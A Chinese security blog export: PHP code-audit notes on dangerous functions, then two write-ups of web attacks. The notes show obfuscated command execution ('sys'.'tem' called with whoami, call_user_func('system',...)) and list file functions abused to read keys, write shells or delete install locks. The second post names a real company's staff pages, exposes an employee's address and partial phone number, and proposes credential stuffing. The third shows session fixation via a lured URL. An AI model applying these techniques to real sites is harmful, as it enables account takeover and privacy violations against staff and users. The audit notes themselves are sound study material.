<p><strong>name参数不存在时：</strong><br><img src="http://static.zybuluo.com/1kbfree/0oayqf6kulmddjdriml2wcsj/image_1ccl8dgoon1s7l1i4d2bh2449.png" alt="image_1ccl8dgoon1s7l1i4d2bh2449.png-46.7kB"></p>
<p><strong>name参数存在时：</strong><br><img src="http://static.zybuluo.com/1kbfree/viyokepu5q9wjmjpbfil69fi/image_1ccl8eog3koq1oa41g4210elf3sm.png" alt="image_1ccl8eog3koq1oa41g4210elf3sm.png-68.8kB"></p>
<hr>
<p><strong>nl2br()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/ikn2i2mm0kgfze57ygqzlc1g/image_1cbrhga1o1i0t1vnl2611jojbkip.png" alt="image_1cbrhga1o1i0t1vnl2611jojbkip.png-22.5kB"></p>
<hr>
<p><strong>eval()函数:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">代码</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">$string &#x3D; &#39;cup&#39;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">$name &#x3D; &#39;coffee&#39;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">$str &#x3D; &#39;This is a $string with my $name in it.&#39;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo $str. &quot;\n&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">eval(&quot;\$str &#x3D; \&quot;$str\&quot;;&quot;);</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo $str. &quot;\n&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>
<p><strong>输出：</strong><br><code>This is a $string with my $name in it.</code><br><code>This is a cup with my coffee in it.</code></p>
<hr>
<p><strong>explode()函数:</strong></p>
<blockquote>
<p>也就是拆分</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/tg27cykixmiyflsw0dofm2bw/image_1ca61lt671266hda1loq1om3gr411.png" alt="image_1ca61lt671266hda1loq1om3gr411.png-28.6kB"></p>
<hr>
<p><strong>copy()函数:</strong></p>
<p><code>copy(source,destination)</code><br>参数 |    描述<br>:-:  | :-:<br>source | 必需。规定要复制的文件。<br>destination | 必需。规定复制文件的目的地。</p>
<p><strong>将文件从 source 拷贝到 destination。如果成功则返回 TRUE，否则返回 FALSE。</strong></p>
<hr>
<p><strong>trim()函数:</strong><br>移除字符串两侧的空格等特殊字符<br><img src="http://static.zybuluo.com/1kbfree/kn3q9kwiadvmp2238ix16c7r/image_1capbh1qhm8vhmp1nu212q7100hm.png" alt="移除字符串两侧的空格等特殊字符.png-14.7kB"></p>
<hr>
<p><strong>strcasecmp()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/iaqdvoetw2l610xgofrbqdje/image_1calh2fsf1pjn50b1nh11h0v1v3d9.png" alt="image_1calh2fsf1pjn50b1nh11h0v1v3d9.png-39.5kB"></p>
<hr>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式:"></a>正则表达式:</h1><p><strong>preg_match()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/xo7lxkjibn4xcrha7t4basxn/image_1calhpof417poa9m1982vhh4n113.png" alt="preg_match函数的参数介绍"></p>
<p><strong>匹配一下<code>i</code>：</strong><br><img src="http://static.zybuluo.com/1kbfree/4d3lofhh58j9i4d4hkm12gsj/image_1cb2e316g1k9mdevmb11v3v15sm2a.png" alt="image_1cb2e316g1k9mdevmb11v3v15sm2a.png-16.9kB"></p>
<p>这里的<code>//</code>是定界符 ，之需要二处字符一样就可以，比如<code>== -- ?? 等等</code> 但是有些不能做定位符 比如a到z、A到Z、0到9、空格、<code>\</code></p>
<p><strong>匹配全部英文字母(包括大写)：</strong><br><img src="http://static.zybuluo.com/1kbfree/3n619fqv4ix1af43vwtkffu7/image_1cb2e8ben2u160k1kuktn1n792n.png" alt="image_1cb2e8ben2u160k1kuktn1n792n.png-33kB"></p>
<p><strong>替换匹配到的内容:</strong><br><img src="http://static.zybuluo.com/1kbfree/9r393wz9lhgio1y8dmamo7pk/image_1cb2ej8kv1l2loph4hd2480l3h.png" alt="image_1cb2ej8kv1l2loph4hd2480l3h.png-20kB"></p>
<hr>
<p><strong>define()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/0sm19cmcccdtny7e32qjs4ud/image_1cau24b5jgimn6h6ge7sd8u19.png" alt="image_1cau24b5jgimn6h6ge7sd8u19.png-19.7kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(name,value,case_insensitive)</span></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">描叙</th>
</tr>
</thead>
<tbody><tr>
<td align="center">name</td>
<td align="center">必需。规定常量的名称。</td>
</tr>
<tr>
<td align="center">value</td>
<td align="center">必需。规定常量的值。</td>
</tr>
<tr>
<td align="center">case_insensitive</td>
<td align="center">可选。规定常量的名称是否对大小写敏感。</td>
</tr>
<tr>
<td align="center"><em>若设置为 true，则对变量名大小写不敏感。默认是 false（大小写敏感）。</em></td>
<td align="center"></td>
</tr>
</tbody></table>
<hr>
<p><strong>dirname()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/mxnhnvrlstywezjh66otbbck/image_1cau2i80e2ag1rp5a721pak1ku4m.png" alt="image_1cau2i80e2ag1rp5a721pak1ku4m.png-39.5kB"><br><code>dirname(path)</code></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">path</td>
<td align="center">必需。规定要检查的路径。</td>
</tr>
</tbody></table>
<p><em>该函数返回去掉文件名后的目录名</em></p>
<hr>
<p><strong>iconv()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/o51s3916gtn2hfrfzr1xn3yy/image_1cau44qdgb61h0u119k11ok1rda1g.png" alt="image_1cau44qdgb61h0u119k11ok1rda1g.png-60.5kB"><br><code>iconv ( in_charset , out_charset , str )</code><br>将字符串 str 从 in_charset 转换编码到 out_charset。 </p>
<p><strong>intval()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/odelzzq42smp1ujet5mx99os/image_1calj80va17dali6obj1bsj1371n.png" alt="image_1calj80va17dali6obj1bsj1371n.png-70.2kB"><br><em>还可以当防止SQL注入:</em><br><img src="http://static.zybuluo.com/1kbfree/me7ctcznhnh9vjhsgj1sx80v/image_1cartbh4v1thh1egn1iga1fcinu1g.png" alt="image_1cartbh4v1thh1egn1iga1fcinu1g.png-14.6kB"></p>
<hr>
<p><strong>reset()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/xefi1xpy95wf4er90jqv8nci/image_1camn387gtjs1pj6imq18fmoap.png" alt="image_1camn387gtjs1pj6imq18fmoap.png-57.2kB"></p>
<hr>
<p><strong>$$变量覆盖:</strong><br><img src="http://static.zybuluo.com/1kbfree/iu6dbthijovu3ek690s9ml8k/image_1campm57rug6ul5e76u4h1ij216.png" alt="image_1campm57rug6ul5e76u4h1ij216.png-36.5kB"></p>
<p><strong>还有一个很有趣的：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    $g &#x3D; &#39;_GET&#39;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $g &#x3D; $$g; &#x2F;&#x2F;这个时候$$g的第二个$与$g的值拼接了变成了$_GET，第一个$变成了$g，所以$g&#x3D;$_GET</span></pre></td></tr><tr><td class="code"><pre><span class="line">    echo $g[&#39;name&#39;];</span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/b9lobeeywliqdiruv21fk0x9/image_1cckvtnv0fkgv9volmk581ue5m.png" alt="image_1cckvtnv0fkgv9volmk581ue5m.png-62.9kB"></p>
<hr>
<p><strong>isset()函数:检测变量是否已设置并且非 NULL</strong><br><strong>unset()函数:释放给定的变量</strong></p>
<hr>
<p><strong>parse_ini_file()  解析一个配置文件。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array parse_ini_file ( string $filename [, bool $process_sections &#x3D; false [, int $scanner_mode &#x3D; INI_SCANNER_NORMAL ]] )</span></pre></td></tr></table></figure>
<p>载入一个由 filename 指定的 ini 文件，并将其中的设置作为一个联合数组返回。</p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">用法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">filename</td>
<td align="center">要解析的 ini 文件的文件名。</td>
</tr>
<tr>
<td align="center">process_sections</td>
<td align="center">如果将最后的 process_sections 参数设为 TRUE，将得到一个多维数组，包括了配置文件中每一节的名称和设置。process_sections 的默认值是 FALSE。</td>
</tr>
<tr>
<td align="center">scanner_mode</td>
<td align="center">Can either be INI_SCANNER_NORMAL (default) or INI_SCANNER_RAW. If INI_SCANNER_RAW is supplied, then option values will not be parsed.</td>
</tr>
</tbody></table>
<blockquote>
<p>返回值： 成功时以关联数组 array 返回设置，失败时返回 FALSE。</p>
</blockquote>
<hr>
<p><strong>urldecode()函数，可能会造成urldecode二次注入：</strong><br><img src="http://static.zybuluo.com/1kbfree/vckacpis6uv1zy6cq7x6z4ef/image_1cao633k6105ecv99s4pre14129.png" alt="image_1cao633k6105ecv99s4pre14129.png-32.1kB"></p>
<hr>
<p><strong>$_FILES用法:</strong><br><img src="http://static.zybuluo.com/1kbfree/5xn30q6ctgadfuuk8s2jhrda/image_1cb241vvp1ls511el1umg44v1oqi9.png" alt="image_1cb241vvp1ls511el1umg44v1oqi9.png-42.7kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/p6mqk381schtf7hjo84aimmx/image_1cb242979174ttbvod71k31e97m.png" alt="image_1cb242979174ttbvod71k31e97m.png-43.3kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/4zvsf8i84xbn8gqb9v51rzj4/image_1cb2494dpm70155kdea1i1217um13.png" alt="image_1cb2494dpm70155kdea1i1217um13.png-117.7kB"></p>
<hr>
<p><strong>is_numeric()函数：</strong></p>
<blockquote>
<p>判断是否为数字，是返回1，不是返回空</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/a425da6hg4dejq3orru2x19m/image_1cao6u6q0cd76121e244i910gm.png" alt="image_1cao6u6q0cd76121e244i910gm.png-24.7kB"></p>
<hr>
<p><strong>dvwa的sql注入的impossible等级源码(dvwa的impossible不存在sql注入)：</strong><br><img src="http://static.zybuluo.com/1kbfree/oz8rvt3lijvznmq5htw60vwg/image_1cao7j7051cek133f1oku1ek51vc13.png" alt="image_1cao7j7051cek133f1oku1ek51vc13.png-47.7kB"><br><em>当然  我看不懂这几行:</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$data &#x3D; $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id &#x3D; (:id) LIMIT 1;&#39; );</span></pre></td></tr><tr><td class="code"><pre><span class="line">$data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );</span></pre></td></tr></table></figure>


<hr>
<p><strong>substr()函数:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">$rest &#x3D; substr(&quot;abcdef&quot;, -1);    &#x2F;&#x2F; 返回 &quot;f&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">$rest &#x3D; substr(&quot;abcdef&quot;, -2);    &#x2F;&#x2F; 返回 &quot;ef&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">$rest &#x3D; substr(&quot;abcdef&quot;, -3, 1); &#x2F;&#x2F; 返回 &quot;d&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">$rest &#x3D; substr(&quot;abcdef&quot;, 0, -1);  &#x2F;&#x2F; 返回 &quot;abcde&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">$rest &#x3D; substr(&quot;abcdef&quot;, 2, -1);  &#x2F;&#x2F; 返回 &quot;cde&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">$rest &#x3D; substr(&quot;abcdef&quot;, 4, -4);  &#x2F;&#x2F; 返回 &quot;&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">$rest &#x3D; substr(&quot;abcdef&quot;, -3, -1); &#x2F;&#x2F; 返回 &quot;de&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>


<hr>
<p><strong>strrpos()函数:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">$foo &#x3D; &quot;0123456789a123456789b123456789c&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">var_dump(strrpos($foo, &#39;7&#39;, -5));  &#x2F;&#x2F; 从尾部第 5 个位置开始查找</span></pre></td></tr><tr><td class="code"><pre><span class="line">                                   &#x2F;&#x2F; 结果: int(17)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">var_dump(strrpos($foo, &#39;7&#39;, 20));  &#x2F;&#x2F; 从第 20 个位置开始查找</span></pre></td></tr><tr><td class="code"><pre><span class="line">                                   &#x2F;&#x2F; 结果: int(27)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">var_dump(strrpos($foo, &#39;7&#39;, 28));  &#x2F;&#x2F; 结果: bool(false)</span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>

<hr>
<p><strong>extract()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/w6zu2eq6hu95plscwo6eipwo/image_1capb8b1l16th19ectna124m6sp9.png" alt="image_1capb8b1l16th19ectna124m6sp9.png-46.6kB"></p>
<hr>
<p><strong>常见语法：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(empty($a)) $a &#x3D; &#39;hello world&#39;; &#x2F;&#x2F;如果$a为空，那么它的值为hello world</span></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$s &#x3D; &#39;sys&#39;.&#39;tem&#39;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">$s(&#39;whoami&#39;); &#x2F;&#x2F;返回desktop-a0iqkh2\iamfree</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;*这里就是执行了whoami的命令*&#x2F;</span></pre></td></tr></table></figure>

<hr>
<p><strong>匿名函数：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$C_F &#x3D; create_function(&#39;$name&#39;,&#39;return $name;&#39;); &#x2F;&#x2F;$name的位置是传递什么参数，第二个参数是函数里执行什么代码</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo $C_F(&#39;iamfree&#39;); &#x2F;&#x2F;输出iamfree</span></pre></td></tr></table></figure>


<hr>
<p><strong>回调函数：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Func($name)&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    echo &quot;hello $name&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">call_user_func(&#39;Func&#39;,&#39;iamfree&#39;); </span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;*输出:hello iamfree*&#x2F;</span></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call_user_func(&#39;system&#39;,&#39;whoami&#39;);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;*输出：desktop-a0iqkh2\iamfree*&#x2F;</span></pre></td></tr></table></figure>


<hr>
<p><strong>命令执行函数：</strong></p>
<ul>
<li>exec() — 执行一个外部程序</li>
<li>passthru() — 执行外部程序并且显示原始输出</li>
<li>proc_open() — 执行一个命令，并且打开用来输入/输出的文件指针。</li>
<li>shell_exec() &amp; `` — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</li>
<li>system() — 执行外部程序，并且显示输出</li>
<li>popen() — 通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。</li>
</ul>
<p><img src="http://static.zybuluo.com/1kbfree/a7jyan6kwd7dig28zvx5zzmc/image_1carr8bt51nu8inj1ovq1b3nai79.png" alt="image_1carr8bt51nu8inj1ovq1b3nai79.png-42.6kB"></p>
<hr>
<p><strong>文件操作函数：</strong></p>
<ul>
<li>copy — 拷贝文件</li>
<li>file_get_contents — 将整个文件读入一个字符串</li>
<li>file_put_contents — 将一个字符串写入文件</li>
<li>file — 把整个文件读入一个数组中</li>
<li>fopen — 打开文件或者 URL</li>
<li>move_uploaded_file — 将上传的文件移动到新位置</li>
<li>readfile — 输出文件</li>
<li>rename — 重命名一个文件或目录</li>
<li>rmdir — 删除目录</li>
<li>unlink &amp; delete — 删除文件</li>
</ul>
<blockquote>
<p>任意文件读取、写入、删除往往是上面几个函数受到了控制（当然还有其他的函数）。<br>不同的函数在不同的场景有不同的作用和不同的利用手法。<br>读取：可以读取配置等文件，拿到key<br>写入：可以写入shell代码相关的内容<br>删除：可以删除.lock文件而可以重新安装覆盖</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/ivg4xj91uyloaum2nyx2fsj2/image_1carrl00k1f4isqn1kthuu9o4rm.png" alt="image_1carrl00k1f4isqn1kthuu9o4rm.png-389.2kB"></p>
<hr>
<h2 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h2><h3 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a>信息泄漏</h3><p><code>bool phpinfo ([ int $what = INFO_ALL ] )</code><br>输出 PHP 当前状态的大量信息，包含了PHP编译选项、启用的扩展、PHP版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path变量、配置选项的本地值和主值、HTTP头和PHP授权信息(License)。</p>
<h3 id="软连接-读取文件内容"><a href="#软连接-读取文件内容" class="headerlink" title="软连接-读取文件内容"></a>软连接-读取文件内容</h3><p><code>bool symlink ( string $target , string $link )</code><br><code>symlink()</code> 对于已有的 target 建立一个名为 link 的符号连接。<br><code>string readlink ( string $path )</code><br><code>readlink()</code> 和同名的 C 函数做同样的事，返回符号连接的内容。</p>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p><code>string getenv ( string $varname )</code><br><strong>获取一个环境变量的值。</strong><br><code>bool putenv ( string $setting )</code><br><strong>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。</strong> 在请求结束时环境会恢复到初始状态。</p>
<h3 id="加载扩展"><a href="#加载扩展" class="headerlink" title="加载扩展"></a>加载扩展</h3><p><code>bool dl ( string $library )</code><br>载入指定参数 library 的 PHP 扩展。</p>
<p><strong>配置相关</strong><br><code>string ini_get ( string $varname )</code></p>
<p><strong>成功时返回配置选项的值。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string ini_set ( string $varname , string $newvalue )</span></pre></td></tr><tr><td class="code"><pre><span class="line">string ini_alter ( string $varname , string $newvalue )</span></pre></td></tr></table></figure>
<p>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。<br><code>void ini_restore ( string $varname )</code><br>恢复指定的配置选项到它的原始值。</p>
<p><strong>数字判断</strong><br><code>bool is_numeric ( mixed $var )</code><br>如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。<br>仅用is_numeric判断而不用intval转换就有可能插入16进制的字符串到数据库，进而可能导致sql二次注入。</p>
<p><strong>数组相关</strong><br><code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code><br>在 haystack 中搜索 needle，如果没有设置 strict 则使用宽松的比较。<br>该函数有一个特性，比较之前会进行自动类型转换。<br><code>in_array($str,$arr)判断$str是否在$arr数组里</code><br><img src="http://static.zybuluo.com/1kbfree/jx7080p95vigv0hnpfkgnu8u/image_1cartm29n1seoieq1o52b2qbn72d.png" alt="image_1cartm29n1seoieq1o52b2qbn72d.png-28.9kB"></p>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p><strong>如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域：</strong><br><code>void parse_str ( string $str [, array &amp;$arr ] )</code><br><strong>本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突：</strong><br><code>int extract ( array &amp;$var_array [, int $extract_type = EXTR_OVERWRITE [, string $prefix = NULL ]] )</code></p>
<p><code>bool mb_parse_str ( string $encoded_string [, array &amp;$result ] )</code><br>解析 <code>GET/POST/COOKIE</code> 数据并设置全局变量。 由于 PHP 不提供原始 POST/COOKIE 数据，目前它仅能够<br>用于 GET 数据。 它解析了 URL 编码过的数据，检测其编码，并转换编码为内部编码，然后设置其值为 array<br>的 result 或者全局变量。<br><code>bool import_request_variables ( string $types [, string $prefix ] )</code><br>将 <code>GET／POST／Cookie</code> 变量导入到全局作用域中。如果你禁止了 <code>register_globals</code>，但又想用到一些全局变<br>量，那么此函数就很有用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">$str &#x3D; &quot;first&#x3D;value&amp;arr[]&#x3D;foo+bar&amp;arr[]&#x3D;baz&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 推荐用法</span></pre></td></tr><tr><td class="code"><pre><span class="line">parse_str($str, $output);</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo $output[&#39;first&#39;];  &#x2F;&#x2F; value</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo $output[&#39;arr&#39;][0]; &#x2F;&#x2F; foo bar</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo $output[&#39;arr&#39;][47]; &#x2F;&#x2F; baz</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 不建议这么用</span></pre></td></tr><tr><td class="code"><pre><span class="line">parse_str($str);</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo $first;  &#x2F;&#x2F; value</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo $arr[0]; &#x2F;&#x2F; foo bar</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo $arr[1]; &#x2F;&#x2F; baz</span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>

<h3 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h3><p><code>array glob ( string $pattern [, int $flags = 0 ] )</code><br>glob() 函数依照 libc glob() 函数使用的规则寻找所有与 pattern 匹配的文件路径，类似于一般shell所用的规则一样。不进行缩写扩展或参数替代。<br><img src="http://static.zybuluo.com/1kbfree/osbwswf3zlroqoo14rq9jjfj/image_1caru9aiu1a5v1qr2p7m1pjlpjq2q.png" alt="image_1caru9aiu1a5v1qr2p7m1pjlpjq2q.png-46.9kB"><br><code>var_dump(glob(&#39;c*.php&#39;)); //列出c开头的PHP文件</code></p>
<h3 id="无参数获取信息"><a href="#无参数获取信息" class="headerlink" title="无参数获取信息"></a>无参数获取信息</h3><p><strong>返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量:</strong><br><code>array get_defined_vars ( void )</code><br><strong>返回当前所有已定义的常量名和值。 这包含 define() 函数所创建的，也包含了所有扩展所创建的:</strong><br><code>array get_defined_constants ([ bool $categorize = false ] )</code><br><strong>返回一个包含所有已定义函数列表的多维数组:</strong><br><code>array get_defined_functions ( void )</code><br><strong>返回所有被 include、 include_once、 require 和 require_once:</strong><br><code>array get_included_files ( void )</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/v8vegj7d7ahhxafqer3gdx7s/image_1carv1gbf9am1c0rnic1gs9156f37.png" alt="image_1carv1gbf9am1c0rnic1gs9156f37.png-218.1kB"></p>
<hr>
<p><strong>rand()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/uv0q2objv84c5sm4z37sk41e/image_1carsup0fqrg1uipj1q1oeb1okv13.png" alt="image_1carsup0fqrg1uipj1q1oeb1okv13.png-29.6kB"></p>
<hr>
<p><strong>$_REQUEST用法：</strong><br><img src="http://static.zybuluo.com/1kbfree/oce7sp8x0ykgb7ju4x6shxhl/image_1cb26fq2i1upk16alpd18eb8pg1g.png" alt="image_1cb26fq2i1upk16alpd18eb8pg1g.png-30kB"></p>
<hr>
<p><strong>file_exists()函数：</strong><br>检查文件或目录是否存在<br><img src="http://static.zybuluo.com/1kbfree/5g83d66qgky6x3w7ws87h8oh/image_1cauetnlg17n874k1qqf11suk537.png" alt="image_1cauetnlg17n874k1qqf11suk537.png-34.8kB"></p>
<hr>
<p><strong>exit用法：</strong><br><img src="http://static.zybuluo.com/1kbfree/2dqkjyv4nuqlkmjkianj3b6j/image_1caufp0at1lt18k71uqkhg51eab3k.png" alt="image_1caufp0at1lt18k71uqkhg51eab3k.png-181.2kB"><br><em>多处用在<code>install.php</code>里，因为成功安装一次之后就能再一次运行安装了，除非将exit删除了。</em></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>获取审核或者其他人的手机号</title>
    <url>/2019/02/11/%E8%8E%B7%E5%8F%96%E5%AE%A1%E6%A0%B8%E6%88%96%E8%80%85%E5%85%B6%E4%BB%96%E4%BA%BA%E7%9A%84%E6%89%8B%E6%9C%BA%E5%8F%B7/</url>
    <content><![CDATA[<p>1、首先，扫到一个站点（<a href="https://webmail.guazi.com/owa/auth/logon.aspx），然后打开，看了一下审查元素，发现里面有点东西" target="_blank" rel="noopener">https://webmail.guazi.com/owa/auth/logon.aspx），然后打开，看了一下审查元素，发现里面有点东西</a>~</p>
<p><img src="http://static.zybuluo.com/1kbfree/69zchkasghq84xr5ymgv49ol/image_1cq1o9mbj1d8qkqsaqr16g81cea9.png" alt="image_1cq1o9mbj1d8qkqsaqr16g81cea9.png-136.1kB"></p>
<p>2、然后打开第一个链接（<a href="https://staff.guazi.com/account/unlock）" target="_blank" rel="noopener">https://staff.guazi.com/account/unlock）</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/gppei4uwlei2jevnra5211xg/image_1cq1ona6bsou16r5u6n3a1e0lm.png" alt="image_1cq1ona6bsou16r5u6n3a1e0lm.png-59.4kB">   </p>
<p>然后想起了审核大大让我提交的邮箱，如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/7qzw6m2xz53oa4gg7jk90xr3/image_1cq1p2de7ts23d41lao1fugem13.png" alt="image_1cq1p2de7ts23d41lao1fugem13.png-28.2kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xinxianquan.bsn &lt;xinxianquan.bsn@guazi.com&gt;</span></pre></td></tr></table></figure>

<p>然后我把<code>xinxianquan.bsn</code>放进去</p>
<p><img src="http://static.zybuluo.com/1kbfree/kpv57iw3634gzw95mcgb3mzb/image_1cq1p450f1dge15j1171i1smqpoi1g.png" alt="image_1cq1p450f1dge15j1171i1smqpoi1g.png-257.8kB"></p>
<p>我去。。。。，手机号码出来了(虽然有4位是那啥~~)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">188****6271</span></pre></td></tr></table></figure>

<p>那么可以去手机号撞库，然后去<code>https://ams.guazi.com/pwd/change</code>来确认</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>cookie可控导致的漏洞</title>
    <url>/2018/12/31/cookie%E5%8F%AF%E6%8E%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1、打开站点发现他有一个请求是这样的</p>
<p><img src="http://static.zybuluo.com/1kbfree/gyoi08v4zw4trz78utbiadx8/4.jpg" alt="1.png-200.5kB"></p>
<p>你可以操作<code>cookie</code>为任何值，那么好玩的来了~</p>
<p>首先假设<code>a</code>用户是受害者，然后我（攻击者）诱导<code>a</code>用户打开如下链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.cn&#x2F;web&#x2F;index&#x2F;weiqi?PHPSESSID&#x3D;123321</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/g4rdm8prblacgiadrd37qy6a/1.png" alt="1.png-155.1kB"></p>
<p>然后我（攻击者）在本地也打开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.cn&#x2F;web&#x2F;index&#x2F;weiqi?PHPSESSID&#x3D;123321</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/ar9pro7zt5ppo9zve5d0n6gk/1.png" alt="1.png-200.9kB"></p>
